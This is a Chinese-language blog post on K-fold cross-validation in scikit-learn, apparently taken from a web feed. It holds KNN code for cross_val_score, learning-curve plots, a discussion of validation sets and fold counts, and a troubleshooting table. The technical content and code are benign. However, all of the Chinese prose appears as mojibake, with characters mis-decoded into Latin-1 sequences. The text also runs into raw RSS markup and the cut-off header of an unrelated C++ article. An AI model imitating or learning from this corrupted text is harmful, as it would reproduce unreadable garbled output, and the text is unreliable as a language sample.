<p>å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>å°†åŸå§‹æ•°æ®é›†éšæœºåˆ’åˆ†ä¸º K ä¸ªç­‰å¤§å°çš„å­é›†ï¼ˆé€šå¸¸ K=5 æˆ– 10ï¼‰</li>
<li>ä¾æ¬¡é€‰å–ç¬¬ i ä¸ªå­é›†ä½œä¸ºéªŒè¯é›†ï¼ˆi=1,2,...,Kï¼‰ï¼Œå…¶ä½™ K-1 ä¸ªå­é›†åˆå¹¶ä½œä¸ºè®­ç»ƒé›†</li>
<li>åœ¨è®­ç»ƒé›†ä¸Šè®­ç»ƒæ¨¡å‹ï¼Œåœ¨éªŒè¯é›†ä¸Šè¯„ä¼°æ¨¡å‹æ€§èƒ½</li>
<li>é‡å¤æ­¥éª¤ 2-3 ç›´åˆ°æ‰€æœ‰å­é›†éƒ½å……å½“è¿‡éªŒè¯é›†</li>
<li>è®¡ç®— K æ¬¡è¯„ä¼°ç»“æœçš„å¹³å‡å€¼ä½œä¸ºæœ€ç»ˆæ¨¡å‹æ€§èƒ½æŒ‡æ ‡</li>
</ol>
<p>è¿™ç§æ–¹æ³•ç›¸æ¯”ç®€å•çš„è®­ç»ƒé›†-æµ‹è¯•é›†åˆ’åˆ†å…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p>
<ul>
<li>å……åˆ†åˆ©ç”¨æœ‰é™çš„æ•°æ®èµ„æº</li>
<li>å‡å°‘æ•°æ®åˆ’åˆ†å¸¦æ¥çš„éšæœºæ€§å½±å“</li>
<li>æä¾›æ›´å¯é çš„æ¨¡å‹æ€§èƒ½è¯„ä¼°</li>
<li>ç‰¹åˆ«é€‚ç”¨äºä¸­å°è§„æ¨¡æ•°æ®é›†</li>
</ul>
<p>å®é™…åº”ç”¨ä¸­ï¼ŒK å€¼çš„é€‰æ‹©éœ€è¦æƒè¡¡ï¼š</p>
<ul>
<li>è¾ƒå°çš„ K å€¼ï¼ˆå¦‚ 5ï¼‰è®¡ç®—æ•ˆç‡æ›´é«˜</li>
<li>è¾ƒå¤§çš„ K å€¼ï¼ˆå¦‚ 10ï¼‰è¯„ä¼°ç»“æœæ›´ç¨³å®š</li>
<li>æç«¯æƒ…å†µ K=Nï¼ˆæ ·æœ¬æ•°ï¼‰æ—¶å³ä¸ºç•™ä¸€æ³•äº¤å‰éªŒè¯</li>
</ul>
<p>é€šè¿‡å¤šæ¬¡äº¤å‰éªŒè¯æ±‚å–å‡å€¼ï¼Œå¯ä»¥æ˜¾è‘—é™ä½å•æ¬¡æ•°æ®åˆ’åˆ†å¸¦æ¥çš„è¯„ä¼°åå·®ï¼Œä¸ºæ¨¡å‹é€‰æ‹©å’Œå‚æ•°è°ƒä¼˜æä¾›æ›´å¯é çš„ä¾æ®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6725d7d8524940d5aacc8aa4cc8731fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=9qFpGDOrsAgN4eB9lt8v2zeYFAc%3D" alt="äº¤å‰éªŒè¯å¤šæ¬¡æµ‹è¯•" loading="lazy"/></p>
<h3 data-id="heading-4">å¸¦äº¤å‰éªŒè¯çš„å­¦ä¹ æ›²çº¿</h3>
<p>å¯¹äºå¸¦äº¤å‰éªŒè¯çš„å­¦ä¹ æ›²çº¿ï¼Œæˆ‘ä»¬éœ€è¦è§‚å¯Ÿçš„å°±ä¸ä»…ä»…æ˜¯æœ€é«˜çš„å‡†ç¡®ç‡äº†ï¼Œè€Œæ˜¯å‡†ç¡®ç‡é«˜ä¸”æ–¹å·®è¿˜ç›¸å¯¹è¾ƒå°çš„ç‚¹ï¼Œè¿™æ ·çš„ç‚¹æ³›åŒ–èƒ½åŠ›æ‰æ˜¯æœ€å¼ºçš„ï¼Œåœ¨äº¤å‰éªŒè¯+å­¦ä¹ æ›²çº¿çš„ä½œç”¨ä¸‹ï¼Œæˆ‘ä»¬é€‰å‡ºçš„è¶…å‚æ•°èƒ½å¤Ÿä¿è¯æ›´å¥½çš„æ³›åŒ–èƒ½åŠ›ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> cross_val_score <span class="hljs-keyword">as</span> CVS
Xtrain,Xtest,Ytrain,Ytest = train_test_split(X,y,test_size=<span class="hljs-number">0.2</span>,random_state=<span class="hljs-number">420</span>)
clf = KNeighborsClassifier(n_neighbors=<span class="hljs-number">8</span>)
<span class="hljs-comment">#è®­ç»ƒé›†å¯¹æŠ˜6æ¬¡ï¼Œä¸€å…±6ä¸ªé¢„æµ‹ç‡è¾“å‡º</span>
cvresult = CVS(clf,Xtrain,Ytrain,cv=<span class="hljs-number">6</span>) 
<span class="hljs-comment">#æ¯æ¬¡äº¤å‰éªŒè¯è¿è¡Œæ—¶ä¼°ç®—å™¨å¾—åˆ†çš„æ•°ç»„</span>
cvresult 
</code></pre>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28755e02a4ad4c0aa4fbc0e970e2ebfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=H1PotusTQW5RO6YsE%2BjyCirbOuM%3D" alt="sklearn äº¤å‰éªŒè¯" loading="lazy"/>
æŸ¥çœ‹å‡å€¼ã€æ–¹å·®</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å‡å€¼ï¼šæŸ¥çœ‹æ¨¡å‹çš„å¹³å‡æ•ˆæœ</span>
cvresult.mean()
<span class="hljs-comment"># æ–¹å·®ï¼šæŸ¥çœ‹æ¨¡å‹æ˜¯å¦ç¨³å®š</span>
cvresult.var()
</code></pre>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45852d79695c49208d1c3dc5ad468218~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=B6hZRxC%2F9%2FJ3Z8M3EXnsPWVvh5k%3D" alt="äº¤å‰éªŒè¯ å‡å€¼ æ–¹å·®" loading="lazy"/>
ç»˜åˆ¶å›¾ç‰‡è¿›è¡ŒæŸ¥çœ‹ï¼š</p>
<pre><code class="hljs language-python" lang="python">score = []
var = []
<span class="hljs-comment">#è®¾ç½®ä¸åŒçš„kå€¼ï¼Œä»1åˆ°19éƒ½çœ‹çœ‹</span>
krange=<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>) 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> krange:
    clf = KNeighborsClassifier(n_neighbors=i)
    cvresult = CVS(clf,Xtrain,Ytrain,cv=<span class="hljs-number">5</span>)
    <span class="hljs-comment"># æ¯æ¬¡äº¤å‰éªŒè¯è¿”å›çš„å¾—åˆ†æ•°ç»„ï¼Œå†æ±‚æ•°ç»„å‡å€¼</span>
    score.append(cvresult.mean()) 
    var.append(cvresult.var())

plt.plot(krange,score,color=<span class="hljs-string">'k'</span>)
plt.plot(krange,np.array(score)+np.array(var)*<span class="hljs-number">2</span>,c=<span class="hljs-string">'red'</span>,linestyle=<span class="hljs-string">'--'</span>)
plt.plot(krange,np.array(score)-np.array(var)*<span class="hljs-number">2</span>,c=<span class="hljs-string">'red'</span>,linestyle=<span class="hljs-string">'--'</span>)
</code></pre>
<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8be8e44493a40d08f38d05e7f452741~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=FPWGqCC%2F99fkzRyM5tYDXs5S24U%3D" alt="äº¤å‰éªŒè¯ ç»˜åˆ¶å›¾è¡¨" loading="lazy"/>
è¾“å‡ºçš„å›¾ç‰‡å¦‚ä¸‹æ‰€ç¤ºï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a31efbd475df465fa99805cc34464dac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=etZQhBlifC%2Br4dkFH%2FfZILdRHsc%3D" alt="äº¤å‰éªŒè¯ ç»˜åˆ¶å›¾è¡¨" loading="lazy"/></p>
<h3 data-id="heading-5">æ˜¯å¦éœ€è¦éªŒè¯é›†</h3>
<p>æœ€æ ‡å‡†ï¼Œæœ€ä¸¥è°¨çš„äº¤å‰éªŒè¯åº”è¯¥æœ‰ä¸‰ç»„æ•°æ®ï¼šè®­ç»ƒé›†ã€éªŒè¯é›†å’Œæµ‹è¯•é›†ã€‚å½“æˆ‘ä»¬è·å–ä¸€ç»„æ•°æ®ä¹‹åï¼š</p>
<ul>
<li>å…ˆå°†æ•°æ®é›†åˆ†æˆæ•´ä½“çš„è®­ç»ƒé›†å’Œæµ‹è¯•é›†</li>
<li>ç„¶åæˆ‘ä»¬æŠŠè®­ç»ƒé›†æ”¾å…¥äº¤å‰éªŒè¯ä¸­</li>
<li>ä»è®­ç»ƒé›†ä¸­åˆ†å‰²æ›´å°çš„è®­ç»ƒé›†ï¼ˆk-1 ä»½ï¼‰å’ŒéªŒè¯æœºï¼ˆ1 ä»½ï¼‰</li>
<li>è¿”å›çš„äº¤å‰éªŒè¯ç»“æœå…¶å®æ˜¯éªŒè¯é›†ä¸Šçš„ç»“æœ</li>
<li>ä½¿ç”¨éªŒè¯é›†å¯»æ‰¾æœ€ä½³å‚æ•°ï¼Œç¡®è®¤ä¸€ä¸ªæˆ‘ä»¬è®¤ä¸ºæ³›åŒ–èƒ½åŠ›æœ€ä½³çš„æ¨¡å‹</li>
<li>å°†è¿™ä¸ªæ¨¡å‹ä½¿ç”¨åœ¨æµ‹è¯•é›†ä¸Šï¼Œè§‚å¯Ÿæ¨¡å‹çš„è¡¨ç°</li>
</ul>
<p>é€šå¸¸æ¥è¯´ï¼Œæˆ‘ä»¬è®¤ä¸ºç»è¿‡éªŒè¯é›†æ‰¾å‡ºæœ€ç»ˆå‚æ•°åçš„æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›æ˜¯å¢å¼ºäº†çš„ï¼Œå› æ­¤æ¨¡å‹åœ¨æœªçŸ¥æ•°æ®ï¼ˆæµ‹è¯•é›†ï¼‰ä¸Šçš„æ•ˆæœä¼šæ›´å¥½ï¼Œä½†å°´å°¬çš„æ˜¯ï¼Œæ¨¡å‹ç»è¿‡äº¤å‰éªŒè¯åœ¨éªŒè¯é›†ä¸Šçš„è°ƒå‚ä¹‹åï¼Œåœ¨æµ‹è¯•é›†ä¸Šçš„ç»“æœæ²¡æœ‰å˜å¥½çš„æƒ…å†µæ—¶æœ‰å‘ç”Ÿã€‚</p>
<p>åŸå› å…¶å®æ˜¯ï¼š</p>
<ul>
<li>æˆ‘ä»¬è‡ªå·±åˆ†çš„è®­ç»ƒé›†å’Œæµ‹è¯•é›†ï¼Œä¼šå½±å“æ¨¡å‹çš„æ•ˆæœ</li>
<li>äº¤å‰éªŒè¯åçš„æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›å¢å¼ºäº†ï¼Œè¡¨ç°å®ƒåœ¨æœªçŸ¥æ•°æ®é›†ä¸Šæ–¹å·®æ›´å°ï¼Œå¹³å‡æ°´å¹³æ›´é«˜ï¼Œä½†å´æ— æ³•ä¿è¯å®ƒåœ¨ç°åœ¨åˆ†å‡ºæ¥çš„æµ‹è¯•é›†ä¸Šé¢„æµ‹èƒ½åŠ›æœ€å¼º</li>
<li>å¦‚æ­¤æ¥è¯´ï¼Œæ˜¯å¦æœ‰æµ‹è¯•é›†çš„å­˜åœ¨ï¼Œå…¶å®æ„ä¹‰ä¸å¤§</li>
</ul>
<p>å¦‚æœæˆ‘ä»¬ç›¸ä¿¡äº¤å‰éªŒè¯çš„è°ƒæ•´ç»“æœæ˜¯å¢å¼ºäº†æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ï¼Œé‚£å³ä¾¿æµ‹è¯•é›†ä¸Šçš„æµ‹è¯•ç»“æœå¹¶æ²¡æœ‰å˜å¥½ï¼ˆç”šè‡³å˜åï¼‰ï¼Œæˆ‘ä»¬ä¹Ÿè®¤ä¸ºæ¨¡å‹æ˜¯æˆåŠŸçš„ã€‚
å¦‚æœæˆ‘ä»¬ä¸ç›¸ä¿¡äº¤å‰éªŒè¯çš„è°ƒæ•´ç»“æœèƒ½å¤Ÿå¢å¼ºæ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ï¼Œè€Œä¸€å®šè¦ä¾èµ–æµ‹è¯•é›†æ¥è¿›è¡Œåˆ¤æ–­ï¼Œæˆ‘ä»¬å®Œå…¨æ²¡æœ‰è¿›è¡Œäº¤å‰éªŒè¯çš„å¿…è¦ï¼Œç›´æ¥ç”¨æµ‹è¯•é›†ä¸Šçš„ç»“æœç”¨æ¥è·‘å­¦ä¹ æ›²çº¿å°±å¥½äº†ã€‚
æ‰€ä»¥ï¼Œç©¶ç«Ÿæ˜¯å¦éœ€è¦éªŒè¯é›†ï¼Œå…¶å®æ˜¯å­˜åœ¨äº‰è®®çš„ï¼Œåœ¨ä¸¥è°¨çš„æƒ…å†µä¸‹ï¼Œå¤§å®¶è¿˜æ˜¯ä½¿ç”¨äº†æœ‰éªŒè¯é›†çš„æ–¹å¼ã€‚</p>
<h3 data-id="heading-6">å…¶ä»–äº¤å‰éªŒè¯</h3>
<p>äº¤å‰éªŒè¯çš„æ–¹æ³•ä¸æ­¢â€œK æŠ˜â€ä¸€ç§ï¼Œåˆ†å‰²è®­ç»ƒé›†å’Œæµ‹è¯•é›†çš„æ–¹æ³•ä¹Ÿä¸æ­¢ä¸€ç§ï¼Œåˆ†é—¨åˆ«ç±»çš„äº¤å‰éªŒè¯å æ®äº† sklearn ä¸­éå¸¸é•¿çš„ä¸€ç« ã€‚
æ‰€æœ‰çš„äº¤å‰éªŒè¯éƒ½æ˜¯åœ¨åˆ†å‰²è®­ç»ƒé›†å’Œæµ‹è¯•é›†ï¼Œåªä¸è¿‡ä¾§é‡çš„æ–¹å‘ä¸åŒã€‚</p>
<ul>
<li>K æŠ˜å°±æ˜¯æŒ‰é¡ºåºå–è®­ç»ƒé›†å’Œæµ‹è¯•é›†</li>
<li>ShuffleSpilt å°±ä¾§é‡äºè®©æµ‹è¯•é›†åˆ†å¸ƒåœ¨æ•°æ®çš„å…¨æ–¹ä½ä¹‹å†…</li>
<li>StratifiedKFold åˆ™è®¤ä¸ºè®­ç»ƒæ•°æ®å’Œæµ‹è¯•æ•°æ®å¿…é¡»åœ¨æ¯ä¸ªæ ‡ç­¾åˆ†ç±»ä¸­å æœ‰ç›¸åŒçš„æ¯”ä¾‹</li>
</ul>
<p>å„ç±»äº¤å‰éªŒè¯çš„åŸç†ç¹çï¼Œå¤§å®¶åœ¨æœºå™¨å­¦ä¹ çš„é“è·¯ä¸Šä¸€å®šä¼šé€æ¸é‡åˆ°æ›´éš¾çš„äº¤å‰éªŒè¯ï¼Œä½†æ˜¯ä¸‡å˜ä¸ç¦»å…¶å®—ï¼šæœ¬è´¨ä¸Šäº¤å‰éªŒè¯æ˜¯ä¸ºäº†è§£å†³è®­ç»ƒé›†å’Œæµ‹è¯•é›†çš„åˆ’åˆ†å¯¹æ¨¡å‹å¸¦æ¥çš„å½±å“ï¼ŒåŒæ—¶æ£€æµ‹æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58ab85d1c5724f38afc0f9727862bda7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=sR9WWcEJBKx5S80nmKCVHA6CmIg%3D" alt="å„ç±»äº¤å‰éªŒè¯" loading="lazy"/></p>
<p>äº¤å‰éªŒè¯çš„æŠ˜æ•°ä¸å¯å¤ªå¤§ï¼Œå› ä¸ºæŠ˜æ•°è¶Šå¤§æŠ½å‡ºæ¥çš„æ•°æ®é›†è¶Šå°ï¼Œè®­ç»ƒæ•°æ®æ‰€å¸¦æ¥çš„ä¿¡æ¯é‡å°±ä¼šè¶Šå°ï¼Œæ¨¡å‹ä¼šè¶Šæ¥è¶Šä¸ç¨³å®šã€‚</p>
<h3 data-id="heading-7">é¿å…æŠ˜æ•°å¤ªå¤§</h3>
<p>å¦‚æœä½ å‘ç°ä¸ä½¿ç”¨äº¤å‰éªŒè¯çš„æ—¶å€™æ¨¡å‹è¡¨ç°å¾ˆå¥½ï¼Œä¸€ä½¿ç”¨æ ¡éªŒéªŒè¯æ¨¡å‹çš„æ•ˆæœå°±éª¤é™</p>
<ul>
<li>ä¸€å®šè¦æŸ¥çœ‹ä½ çš„æ ‡ç­¾æ˜¯å¦æœ‰é¡ºåˆ©</li>
<li>ç„¶åå°±æ˜¯æŸ¥çœ‹ä½ çš„æ•°æ®é‡æ˜¯å¦å¤ªå°ï¼ŒæŠ˜æ•°æ˜¯å¦å¤ªé«˜</li>
</ul>
<p>å¦‚æœå°†ä¸Šé¢ä¾‹é¢˜çš„ä»£ç ä¸­å°† cv å°† 5 æ”¹æˆ 100ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-python" lang="python">score = []
var = []
<span class="hljs-comment">#è®¾ç½®ä¸åŒçš„kå€¼ï¼Œä»1åˆ°19éƒ½çœ‹çœ‹</span>
krange=<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>) 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> krange:
    clf = KNeighborsClassifier(n_neighbors=i)
    cvresult = CVS(clf,Xtrain,Ytrain,cv=<span class="hljs-number">100</span>)
    <span class="hljs-comment"># æ¯æ¬¡äº¤å‰éªŒè¯è¿”å›çš„å¾—åˆ†æ•°ç»„ï¼Œå†æ±‚æ•°ç»„å‡å€¼</span>
    score.append(cvresult.mean()) 
    var.append(cvresult.var())

plt.plot(krange,score,color=<span class="hljs-string">'k'</span>)
plt.plot(krange,np.array(score)+np.array(var)*<span class="hljs-number">2</span>,c=<span class="hljs-string">'red'</span>,linestyle=<span class="hljs-string">'--'</span>)
plt.plot(krange,np.array(score)-np.array(var)*<span class="hljs-number">2</span>,c=<span class="hljs-string">'red'</span>,linestyle=<span class="hljs-string">'--'</span>)
</code></pre>
<p>ç”Ÿæˆå›¾ç‰‡å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c6ae2c16948404f9d97475e158d26ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=wtEW3ipBF8a9YABI%2BbYIIMDkbN0%3D" alt="æŠ˜æ•°å›¾è¡¨ç»˜åˆ¶" loading="lazy"/></p>
<p>æŠ˜æ•°è¿‡å¤§ï¼š</p>
<ul>
<li>è¿ç®—æ•ˆç‡å˜æ…¢</li>
<li>é¢„æµ‹ç‡æ–¹å·®å˜å¤§ï¼Œéš¾ä»¥ä¿è¯åœ¨æ–°çš„æ•°æ®é›†è¾¾åˆ°é¢„æœŸé¢„æµ‹ç‡</li>
</ul>
<h2 data-id="heading-8">é”™è¯¯é€ŸæŸ¥</h2>





















































<table><thead><tr><th>ç—‡çŠ¶</th><th>æ ¹å› </th><th>å®šä½</th><th>ä¿®å¤</th></tr></thead><tbody><tr><td>æ¯æ¬¡è·‘åˆ†å·®å¼‚å¾ˆå¤§ï¼Œæ›²çº¿å¿½é«˜å¿½ä½</td><td>å•æ¬¡éšæœºåˆ’åˆ†å¯¼è‡´è¯„ä¼°æ–¹å·®å¤§ï¼›æ•°æ®é‡å°/ç±»åˆ«ä¸å‡è¡¡æ›´æ˜æ˜¾</td><td>å›ºå®š random_state å¯¹æ¯”ï¼›æ‰“å°æ¯æ¬¡åˆ’åˆ†çš„ç±»åˆ«å æ¯”</td><td>ç”¨ K æŠ˜äº¤å‰éªŒè¯è¾“å‡º mean/varï¼›åˆ†ç±»ä»»åŠ¡ä¼˜å…ˆ StratifiedKFold/StratifiedShuffleSplitï¼›å¿…è¦æ—¶æ‰©å¤§æ•°æ®é‡</td></tr><tr><td>äº¤å‰éªŒè¯ååœ¨æµ‹è¯•é›†åè€Œæ›´å·®</td><td>åœ¨éªŒè¯æŠ˜ä¸Šâ€œè¿‡åº¦è°ƒå‚â€ï¼›æµ‹è¯•é›†åˆ’åˆ†æœ¬èº«å</td><td>å¯¹æ¯”ä¸åŒéšæœºç§å­çš„æµ‹è¯•é›†ç»“æœåˆ†å¸ƒ</td><td>ä¸¥æ ¼ä¸‰æ®µå¼ï¼štrain +ï¼ˆCV è°ƒå‚ï¼‰+ testï¼›æˆ–ç”¨ nested CVï¼›å‡å°‘è¶…å‚æœç´¢ç©ºé—´</td></tr><tr><td>cv è®¾ç½®å¾ˆå¤§ï¼ˆå¦‚ 100ï¼‰ååˆ†æ•°å¤§å¹…ä¸‹é™ä¸”æ³¢åŠ¨å¢å¤§</td><td>æ¯æŠ˜è®­ç»ƒé›†è¿‡å°ï¼Œæ¨¡å‹ä¼°è®¡ä¸ç¨³ï¼›è¿ç®—é‡æš´æ¶¨</td><td>è§‚å¯Ÿæ¯æŠ˜æ ·æœ¬æ•°ï¼šn_samples / cvï¼›çœ‹ var æ˜¯å¦é£™å‡</td><td>æ§åˆ¶ cvï¼ˆå¸¸ç”¨ 5 æˆ– 10ï¼‰ï¼›å°æ•°æ®ç”¨é‡å¤ K æŠ˜ï¼ˆRepeatedKFoldï¼‰è€Œä¸æ˜¯æå¤§ cv</td></tr><tr><td>æŠ¥é”™ï¼šThe least populated class in y has only 1 member</td><td>åˆ†å±‚äº¤å‰éªŒè¯ä¸‹ï¼ŒæŸäº›ç±»åˆ«æ ·æœ¬å¤ªå°‘ï¼Œæ— æ³•åˆ†æŠ˜</td><td>æŸ¥çœ‹ y å„ç±»åˆ«è®¡æ•°</td><td>åˆå¹¶ç¨€æœ‰ç±»/è¡¥æ ·æœ¬/é™ä½ cvï¼›æˆ–æ”¹ç”¨ä¸åˆ†å±‚ä½†éœ€æ‰¿æ‹…åˆ†å¸ƒæ¼‚ç§»é£é™©</td></tr><tr><td>CV åˆ†æ•°å¼‚å¸¸é«˜ï¼Œçº¿ä¸Šæ•ˆæœå¾ˆå·®</td><td>æ•°æ®æ³„æ¼ï¼šåœ¨ CV ä¹‹å‰åšäº†å…¨é‡æ ‡å‡†åŒ–/ç‰¹å¾é€‰æ‹©/ç¼–ç </td><td>æ£€æŸ¥é¢„å¤„ç†æ˜¯å¦åœ¨ fit å‰ç”¨åˆ°å…¨é‡æ•°æ®</td><td>ç”¨ Pipeline æŠŠé¢„å¤„ç†æ”¾è¿› CVï¼ˆStandardScaler/Encoder/SelectKBest ç­‰éƒ½åœ¨æŠ˜å†… fitï¼‰</td></tr><tr><td>åŒä¸€ä»½ä»£ç åœ¨ä¸åŒæœºå™¨ç»“æœä¸ä¸€è‡´</td><td>å¹¶è¡Œ/éšæœºæ€§/æµ®ç‚¹å·®å¼‚ï¼›æœªå›ºå®šç§å­</td><td>æ£€æŸ¥ random_stateã€n_jobsã€numpy éšæœºç§å­</td><td>å›ºå®š random_stateï¼›å¿…è¦æ—¶ n_jobs=1 å¤ç°ï¼›è®°å½•ä¾èµ–ç‰ˆæœ¬ä¸ç¡¬ä»¶ä¿¡æ¯</td></tr><tr><td>æŒ‡æ ‡çœ‹èµ·æ¥â€œç¨³å®šâ€ä½†ä¸šåŠ¡ä¸è¾¾æ ‡</td><td>é€‰é”™ scoringï¼ˆaccuracy ä¸é€‚åˆä¸å‡è¡¡ï¼‰ï¼›åªçœ‹å‡å€¼ä¸çœ‹ä¸šåŠ¡çº¦æŸ</td><td>å¯¹æ¯”å¤šæŒ‡æ ‡ï¼šprecision/recall/F1/AUCï¼›çœ‹æ··æ·†çŸ©é˜µ</td><td>æ˜ç¡®ä¸šåŠ¡ç›®æ ‡ä¸é˜ˆå€¼ï¼›è®¾ç½® scoringï¼›åˆ†ç±»ä¸å‡è¡¡ç”¨ macro/weighted æŒ‡æ ‡å¹¶é…åˆåˆ†å±‚ CV</td></tr></tbody></table>
<h2 data-id="heading-9">å…¶ä»–ç³»åˆ—</h2>
<h3 data-id="heading-10">ğŸš€ AIç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>AIç‚¼ä¸¹æ—¥å¿—-29 - å­—èŠ‚è·³åŠ¨ DeerFlow æ·±åº¦ç ”ç©¶æ¡†<em>æ–œä½“æ ·å¼</em>æ¶ ç§æœ‰éƒ¨ç½² æµ‹è¯•ä¸Šæ‰‹ æ¶æ„ç ”ç©¶</strong>ï¼ŒæŒç»­æ‰“é€ å®ç”¨AIå·¥å…·æŒ‡å—ï¼
<strong>AIç ”ç©¶-132 Java ç”Ÿæ€å‰æ²¿ 2025ï¼šSpringã€Quarkusã€GraalVMã€CRaC ä¸äº‘åŸç”Ÿè½åœ°</strong></p>
<h3 data-id="heading-11">ğŸ’» Javaç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>Java-207 RabbitMQ Direct äº¤æ¢å™¨è·¯ç”±ï¼šRoutingKey ç²¾ç¡®åŒ¹é…ã€é˜Ÿåˆ—å¤šç»‘å®šä¸æ—¥å¿—åˆ†æµå®æˆ˜</strong>
MyBatis å·²å®Œç»“ï¼ŒSpring å·²å®Œç»“ï¼ŒNginxå·²å®Œç»“ï¼ŒTomcatå·²å®Œç»“ï¼Œåˆ†å¸ƒå¼æœåŠ¡å·²å®Œç»“ï¼ŒDubboå·²å®Œç»“ï¼ŒMySQLå·²å®Œç»“ï¼ŒMongoDBå·²å®Œç»“ï¼ŒNeo4jå·²å®Œç»“ï¼ŒFastDFS å·²å®Œç»“ï¼ŒOSSå·²å®Œç»“ï¼ŒGuavaCacheå·²å®Œç»“ï¼ŒEVCacheå·²å®Œç»“ï¼ŒRabbitMQæ­£åœ¨æ›´æ–°... æ·±å…¥æµ…å‡ºåŠ©ä½ æ‰“ç‰¢åŸºç¡€ï¼</p>
<h3 data-id="heading-12">ğŸ“Š å¤§æ•°æ®æ¿å—å·²å®Œæˆå¤šé¡¹å¹²è´§æ›´æ–°ï¼ˆ300ç¯‡ï¼‰ï¼š</h3>
<p>åŒ…æ‹¬ Hadoopã€Hiveã€Kafkaã€Flinkã€ClickHouseã€Elasticsearch ç­‰äºŒåä½™é¡¹æ ¸å¿ƒç»„ä»¶ï¼Œè¦†ç›–ç¦»çº¿+å®æ—¶æ•°ä»“å…¨æ ˆï¼
<strong>å¤§æ•°æ®-278 Spark MLib - åŸºç¡€ä»‹ç» æœºå™¨å­¦ä¹ ç®—æ³• æ¢¯åº¦æå‡æ ‘ GBDTæ¡ˆä¾‹ è¯¦è§£</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C++è™šå‡½æ•°è¡¨ä¸å¤šé‡ç»§æ‰¿å†…å­˜å¸ƒå±€æ·±åº¦å‰–æ]]></title>    <link>https://juejin.cn/post/7588388014504542250</link>    <guid>https://juejin.cn/post/7588388014504542250</guid>    <pubDate>2025-12-28T13:36:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588388014504542250" data-draft-id="7588191506607390726" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C++è™šå‡½æ•°è¡¨ä¸å¤šé‡ç»§æ‰¿å†…å­˜å¸ƒå±€æ·±åº¦å‰–æ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-28T13:36:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 